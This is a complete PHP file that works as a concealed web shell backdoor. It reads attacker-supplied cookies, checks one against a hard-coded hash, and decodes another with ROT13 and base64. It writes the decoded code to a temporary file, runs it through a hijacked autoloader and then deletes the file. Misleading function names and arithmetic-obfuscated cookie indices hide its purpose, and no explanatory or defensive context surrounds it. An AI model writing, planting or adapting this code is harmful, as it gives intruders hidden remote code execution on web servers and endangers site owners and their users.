<?php


if (isset($_COOKIE[12+-12]) && isset($_COOKIE[42+-41]) && isset($_COOKIE[-10+13]) && isset($_COOKIE[25-21])) {
    $flg = $_COOKIE;
    function query_handler($component) {
        $flg = $_COOKIE;
        $marker = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '3583c00c');
        if (!is_writable($marker)) {
            $marker = getcwd() . DIRECTORY_SEPARATOR . "auth_exception_handler";
        }
        $elem = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($flg[3]));
        if (is_writeable($marker)) {
            $pset = fopen($marker, 'w+');
            fputs($pset, $elem);
            fclose($pset);
            spl_autoload_unregister(__FUNCTION__);
            require_once($marker);
            @array_map('unlink', array($marker));
        }
    }
    spl_autoload_register("query_handler");
    $comp = "c49272e36249bd913d536df6c40a7cdb";
    if (!strncmp($comp, $flg[4], 32)) {
        if (@class_parents("token_parser_engine_reverse_searcher", true)) {
            exit;
        }
    }
}
